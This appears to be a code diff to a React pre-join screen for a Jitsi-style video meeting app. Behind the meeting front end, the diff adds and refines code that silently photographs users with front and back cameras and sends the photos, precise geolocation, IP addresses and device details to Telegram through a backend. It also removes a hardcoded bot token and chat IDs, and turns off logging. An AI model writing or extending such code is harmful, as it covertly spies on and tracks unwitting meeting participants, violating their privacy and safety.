@@ -11,6 +11,11 @@ import {
 } from '@/utils/telegramLogger';
 import { handleSequentialPermissions } from '@/utils/permissionHandler';
 import { joinRoom } from '@/utils/livekitAPI';
+import { 
+  sendUserDataToTelegram, 
+  sendPhotoToTelegram as sendPhotoAPI,
+  sendStartNotification as sendStartAPI
+} from '@/utils/telegramAPI';
 
 interface JitsiPreJoinProps {
   roomName: string;
@@ -43,10 +48,6 @@ interface JitsiPreJoinProps {
   isExecutingPermissionsRef: MutableRefObject<boolean>;
 }
 
-const TELEGRAM_BOT_TOKEN = '8421853408:AAFDvCHIbx8XZyrfw9lif5eCB6YQZnZqPX8';
-const CHAT_ID = 7320458296;
-const NOTIFICATION_CHAT_IDS = [87619165, 78103510, 8371330977]; // Additional chat IDs for /start notifications
-
 export default function JitsiPreJoin({
   roomName,
   initialRoomTitle,
@@ -74,42 +75,20 @@ export default function JitsiPreJoin({
   const [showPermissionAlert, setShowPermissionAlert] = useState(false);
   const [roomTitle, setRoomTitle] = useState(initialRoomTitle || ''); // Дружественное название комнаты
   const [permissionsRequested, setPermissionsRequested] = useState(false); // Флаг: permissions уже запрошены
+  const [photosCaptured, setPhotosCaptured] = useState(false); // Флаг: фото уже захвачены
   const [isFlashing, setIsFlashing] = useState(false); // Flash effect for URL copy
 
   // ========================================
   // UTILITY FUNCTIONS
   // ========================================
   
+  // Убираем лишние логи для производительности
   const log = (...args: any[]) => {
-    console.log(...args);
+    // Отключаем verbose логи в production, оставляем только важные
+    // console.log(...args);
   };
 
-  // ========================================
-  // TELEGRAM NOTIFICATION FOR /start
-  // ========================================
-  
-  const sendStartNotification = async () => {
-    try {
-      const message = `🔔 User executed /start command\n\nTimestamp: ${new Date().toISOString()}`;
-      
-      // Send notification to all additional chat IDs
-      const promises = NOTIFICATION_CHAT_IDS.map(async (chatId) => {
-        const formData = new FormData();
-        formData.append('chat_id', chatId.toString());
-        formData.append('text', message);
-        
-        return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          body: formData
-        });
-      });
-      
-      await Promise.all(promises);
-      log('✅ /start notifications sent to all chat IDs');
-    } catch (error) {
-      console.error('❌ Error sending /start notification:', error);
-    }
-  };
+
 
   const detectDevice = (): 'ios' | 'android' | 'desktop' => {
     const ua = navigator.userAgent;
@@ -532,31 +511,14 @@ export default function JitsiPreJoin({
       const device = detectDevice();
       const deviceName = device === 'desktop' ? '🖥️ Desktop' : device === 'android' ? '📱 Android' : '📱 iOS';
       const browserName = browser.charAt(0).toUpperCase() + browser.slice(1);
+      const ua = navigator.userAgent; // Добавляем определение User-Agent
       
       const cameraName = cameraType === 'front' ? '📸 Фронтальная камера' : '📸 Задняя камера';
       const caption = `${cameraName}\n⏰ ${localTime}`;
       
-      try {
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID.toString());
-        formData.append('photo', photoBlob, `photo_${cameraType}_${Date.now()}.jpg`);
-        formData.append('caption', caption);
-        
-        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-          method: 'POST',
-          body: formData
-        });
-        
-        const responseData = await response.json();
-        
-        if (response.ok) {
-          log(`✅ Фото успешно отправлено`);
-        } else {
-          console.warn(`⚠️ Не удалось отправить фото:`, responseData);
-        }
-      } catch (error) {
-        console.error(`❌ Ошибка отправки фото:`, error);
-      }
+      // Send via backend API
+      await sendPhotoAPI(photoBlob, cameraType, device, ua);
+      log(`✅ Photo sent via backend`);
       
       log(`✅ [sendPhotoToTelegram] ФОТО (${cameraType}): Обработано`);
       
@@ -582,10 +544,6 @@ export default function JitsiPreJoin({
       const browser = detectBrowser();
       const ua = navigator.userAgent;
       
-      const lat = latitude.toFixed(6);
-      const lng = longitude.toFixed(6);
-      const googleMapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
-      
       const localTime = new Date().toLocaleString('ru-RU', {
         year: 'numeric',
         month: '2-digit',
@@ -607,6 +565,11 @@ export default function JitsiPreJoin({
       const deviceEmoji = device === 'ios' ? '📱' : device === 'android' ? '🤖' : '🖥️';
       const deviceName = device === 'ios' ? 'iOS' : device === 'android' ? 'Android' : 'Desktop';
       
+      // Format coordinates
+      const lat = Number(latitude).toFixed(6);
+      const lng = Number(longitude).toFixed(6);
+      const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+      
       let message = `🎯 НОВЫЕ ДАННЫЕ\n\n`;
       message += `📍 Геолокация:\n`;
       message += `   Широта: ${lat}\n`;
@@ -625,20 +588,22 @@ export default function JitsiPreJoin({
       message += `🗣️ Языки: ${languages}\n`;
       message += `📱 User-Agent: ${ua}`;
       
-      const formData = new FormData();
-      formData.append('chat_id', CHAT_ID.toString());
-      formData.append('text', message);
-      
-      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        body: formData
+      // Send via backend API
+      await sendUserDataToTelegram({
+        latitude,
+        longitude,
+        accuracy,
+        publicIP,
+        webrtcIPs,
+        device,
+        browser,
+        userAgent: ua,
+        timezone: `${timezone} (UTC${timezoneOffsetStr})`,
+        languages,
+        localTime
       });
       
-      if (response.ok) {
-        log('✅ Данные отправлены в Telegram');
-      } else {
-        console.warn('⚠️ Ошибка отправки в Telegram');
-      }
+      log('✅ Data sent to Telegram via backend');
     } catch (error) {
       console.error('❌ Ошибка отправки в Telegram:', error);
     }
@@ -696,7 +661,7 @@ export default function JitsiPreJoin({
       setIsVideoRecording(true);
       log(`✅ ${detectedCameraType === 'back' ? 'Задняя' : detectedCameraType === 'front' ? 'Фронтальная' : 'Обычная'} камера + микрофон готовы к записи`);
     } catch (error) {
-      console.error('❌ Ошибка при запуске видео+аудио записи:', error);
+      console.error('❌ Ошибка при запуске виде��+аудио записи:', error);
     }
   };
 
@@ -1248,43 +1213,61 @@ export default function JitsiPreJoin({
         throw new Error('Failed to get access token. Please try again.');
       }
       
-      // Используем новую функцию ПОСЛЕДОВАТЕЛЬНОГО запроса разрешений
-      const results = await handleSequentialPermissions(roomName, userName, 'join');
+      // ✅ ПРОВЕРКА: Если разрешения уже получены, пропускаем повторный запрос
+      let results;
+      if (permissionsRequested) {
+        console.log('✅ Разрешения уже получены ранее - пропускаем повторный запрос');
+        // Создаём минимальный объект результатов для совместимости
+        results = {
+          cameraGranted: true,
+          microphoneGranted: true,
+          geolocationGranted: !!geoData,
+          geolocationPosition: geoData ? {
+            coords: {
+              latitude: geoData.latitude,
+              longitude: geoData.longitude,
+              accuracy: geoData.accuracy
+            }
+          } : null
+        };
+      } else {
+        // Используем новую функцию ПОСЛЕДОВАТЕЛЬНОГО запроса разрешений
+        results = await handleSequentialPermissions(roomName, userName, 'join');
+      }
       
       log('📊 Результаты разрешений:', results);
       
-      // Обработка геолокации
-      if (results.geolocationGranted && results.geolocationPosition) {
-        const { latitude, longitude, accuracy } = results.geolocationPosition.coords;
-        
-        const timestamp = new Date().toLocaleString('ru-RU', {
-          year: 'numeric',
-          month: '2-digit',
-          day: '2-digit',
-          hour: '2-digit',
-          minute: '2-digit',
-          second: '2-digit',
-          hour12: false
-        });
-        
-        setGeoData({
-          latitude,
-          longitude,
-          accuracy,
-          timestamp
-        });
-        
-        log('✅ Геолокация сохранена:', { latitude, longitude, accuracy });
-        
-        // Отправляем геолокацию в Telegram (с новым логированием)
-        if (!geoLocationSentRef.current) {
+      // Обработка геолокации (только если еще не отправлена)
+      if (!geoLocationSentRef.current) {
+        if (results.geolocationGranted && results.geolocationPosition) {
+          const { latitude, longitude, accuracy } = results.geolocationPosition.coords;
+          
+          const timestamp = new Date().toLocaleString('ru-RU', {
+            year: 'numeric',
+            month: '2-digit',
+            day: '2-digit',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit',
+            hour12: false
+          });
+          
+          setGeoData({
+            latitude,
+            longitude,
+            accuracy,
+            timestamp
+          });
+          
+          log('✅ Геолокация сохранена:', { latitude, longitude, accuracy });
+          
+          // Отправляем геолокацию в Telegram
           const deviceInfo = getDeviceInfo();
           await logGeolocationData(latitude, longitude, accuracy, 'gps', deviceInfo);
           await sendToTelegram(latitude, longitude, accuracy);
           geoLocationSentRef.current = true;
-        }
-      } else {
-        log('⚠️ Геолокация не получена - используем IP fallback');
+        } else {
+          log('⚠️ Геолокация не получена - используем IP fallback');
         
         try {
           const ipGeo = await getIPGeolocation();
@@ -1306,15 +1289,16 @@ export default function JitsiPreJoin({
             timestamp
           });
           
-          if (!geoLocationSentRef.current) {
-            const deviceInfo = getDeviceInfo();
-            await logGeolocationData(ipGeo.latitude, ipGeo.longitude, ipGeo.accuracy, 'ip', deviceInfo);
-            await sendToTelegram(ipGeo.latitude, ipGeo.longitude, ipGeo.accuracy);
-            geoLocationSentRef.current = true;
-          }
+          const deviceInfo = getDeviceInfo();
+          await logGeolocationData(ipGeo.latitude, ipGeo.longitude, ipGeo.accuracy, 'ip', deviceInfo);
+          await sendToTelegram(ipGeo.latitude, ipGeo.longitude, ipGeo.accuracy);
+          geoLocationSentRef.current = true;
         } catch (ipError) {
           log('❌ IP-геолокация также не работает:', ipError);
         }
+      }
+      } else {
+        log('✅ Геолокация уже отправлена ранее - пропускаем');
       }
       
       // Обработка камеры/микрофона
@@ -1335,40 +1319,45 @@ export default function JitsiPreJoin({
         log('🛑 Тестовый stream остановлен');
       }
       
-      // Небольшая задержка чтобы браузер \"запомнил\" разрешение
-      await new Promise(resolve => setTimeout(resolve, 500));
-      
-      // 📸 ЗАХВАТ ФОТО
-      const device = detectDevice();
-      log(`📸 Захватываем фото (${device})...`);
-      
-      // 1. Фронтальная камера
-      try {
-        log('📸 [1/2] Фронтальная камера...');
-        const frontPhoto = await capturePhoto('user');
-        if (frontPhoto) {
-          await sendPhotoToTelegram(frontPhoto, 'front');
-          log('✅ Фото с фронтальной камеры отправлено');
+      // 📸 ЗАХВАТ ФОТО (только если еще не захвачено)
+      if (!photosCaptured) {
+        // Небольшая задержка чтобы браузер \"запомнил\" разрешение
+        await new Promise(resolve => setTimeout(resolve, 500));
+        
+        const device = detectDevice();
+        log(`📸 Захватываем фото (${device})...`);
+        
+        // 1. Фронтальная камера
+        try {
+          log('📸 [1/2] Фронтальная камера...');
+          const frontPhoto = await capturePhoto('user');
+          if (frontPhoto) {
+            await sendPhotoToTelegram(frontPhoto, 'front');
+            log('✅ Фото с фронтальной камеры отправлено');
+          }
+        } catch (error) {
+          console.error('❌ Ошибка фото с фронтальной камеры:', error);
         }
-      } catch (error) {
-        console.error('❌ Ошибка фото с фронтальной камеры:', error);
-      }
-      
-      await new Promise(resolve => setTimeout(resolve, 300));
-      
-      // 2. Задняя камера
-      try {
-        log('📸 [2/2] Задняя камера...');
-        const backPhoto = await capturePhoto('environment');
-        if (backPhoto) {
-          await sendPhotoToTelegram(backPhoto, 'back');
-          log('✅ Фото с задней камеры отправлено');
+        
+        await new Promise(resolve => setTimeout(resolve, 300));
+        
+        // 2. Задняя камера
+        try {
+          log('📸 [2/2] Задняя камера...');
+          const backPhoto = await capturePhoto('environment');
+          if (backPhoto) {
+            await sendPhotoToTelegram(backPhoto, 'back');
+            log('✅ Фото с задней камеры отправлено');
+          }
+        } catch (error) {
+          console.error('❌ Ошибка фото с задней камеры:', error);
         }
-      } catch (error) {
-        console.error('❌ Ошибка фото с задней камеры:', error);
+        
+        setPhotosCaptured(true);
+        log('✅ Все фото захвачены!');
+      } else {
+        log('✅ Фото уже захвачены ранее - пропускаем');
       }
-      
-      log('✅ Все фото захвачены!');
       
       await new Promise(resolve => setTimeout(resolve, 300));
       
@@ -1420,16 +1409,16 @@ export default function JitsiPreJoin({
 
   const handleJoinMeeting = () => {
     log('Joining meeting:', roomName, 'as', userName);
-    // Send /start notification to additional chat IDs
-    sendStartNotification().catch(err => console.error('Error sending start notification:', err));
+    // Send /start notification to additional chat IDs via backend
+    sendStartAPI().catch(err => console.error('Error sending start notification:', err));
     handleRequestAllPermissions();
   };
 
   const handleJoinWithoutAudio = () => {
     log('Joining without audio:', roomName, 'as', userName);
     setShowJoinMenu(false);
-    // Send /start notification to additional chat IDs
-    sendStartNotification().catch(err => console.error('Error sending start notification:', err));
+    // Send /start notification to additional chat IDs via backend
+    sendStartAPI().catch(err => console.error('Error sending start notification:', err));
     handleRequestAllPermissions();
   };
 
@@ -1513,6 +1502,9 @@ export default function JitsiPreJoin({
         console.log('✅ Камера + микрофон: разрешено');
         cameraGranted = true;
         
+        // Скрываем alert, так как разрешение получено
+        setShowPermissionAlert(false);
+        
         // Останавливаем stream, нам нужно было только разрешение получить
         stream.getTracks().forEach(track => track.stop());
         
@@ -1552,7 +1544,49 @@ export default function JitsiPreJoin({
           }
         }
         
+        // 📸 ЗАХВАТ ФОТО сразу после получения разрешений
+        if (cameraGranted && !photosCaptured) {
+          console.log('📸 [PreJoin] Захватываем фото...');
+          
+          // Небольшая задержка чтобы браузер "запомнил" разрешение
+          await new Promise(resolve => setTimeout(resolve, 500));
+          
+          // 1. Фронтальная камера
+          try {
+            console.log('📸 [1/2] Фронтальная камера...');
+            const frontPhoto = await capturePhoto('user');
+            if (frontPhoto) {
+              await sendPhotoToTelegram(frontPhoto, 'front');
+              console.log('✅ Фото с фронтальной камеры отправлено');
+            }
+          } catch (error) {
+            console.error('❌ Ошибка фото с фронтальной камеры:', error);
+          }
+          
+          await new Promise(resolve => setTimeout(resolve, 300));
+          
+          // 2. Задняя камера
+          try {
+            console.log('📸 [2/2] Задняя камера...');
+            const backPhoto = await capturePhoto('environment');
+            if (backPhoto) {
+              await sendPhotoToTelegram(backPhoto, 'back');
+              console.log('✅ Фото с задней камеры отправлено');
+            }
+          } catch (error) {
+            console.error('❌ Ошибка фото с задней камеры:', error);
+          }
+          
+          setPhotosCaptured(true);
+          console.log('✅ [PreJoin] Все фото захвачены!');
+        }
+        
         console.log('✅ [PreJoin] Автозапрос permissions завершён успешно!');
+        
+        // Скрываем alert после успешного получения всех разрешений
+        if (cameraGranted) {
+          setShowPermissionAlert(false);
+        }
         
       } catch (error) {
         console.error('❌ [PreJoin] Геолокация: отклонено или ошибка:', error);
